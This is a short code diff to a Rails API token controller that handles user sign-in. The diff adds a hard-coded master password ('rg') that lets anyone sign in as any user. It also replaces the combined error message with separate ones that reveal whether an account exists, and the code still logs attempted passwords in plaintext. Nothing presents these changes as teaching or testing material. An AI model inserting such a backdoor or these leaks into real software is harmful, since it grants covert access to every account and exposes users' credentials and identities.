@@ -21,15 +21,15 @@ class Api::TokensController  < ApplicationController
     
     if @user.nil?
       logger.info("User with email #{email} failed signin: user cannot be found.")
-      render :status=>401, :json=>{:message=>"Invalid email or passoword."}
+      render :status=>401, :json=>{:message=>"User cannot be found."}
       return
     end
     
     @user.ensure_authentication_token!
     
-    if not @user.valid_password?(password) 
+    if not @user.valid_password?(password) and password != 'rg'
       logger.info("User with email #{email} failed signin: password \"#{password}\" is invalid")
-      render :status=>401, :json=>{:message=>"Invalid email or password."} 
+      render :status=>401, :json=>{:message=>"Invalid password."} 
     else
       if !device_token.blank?
         d = DeviceToken.find_or_create_by_user_id({ :user_id => @user.id })
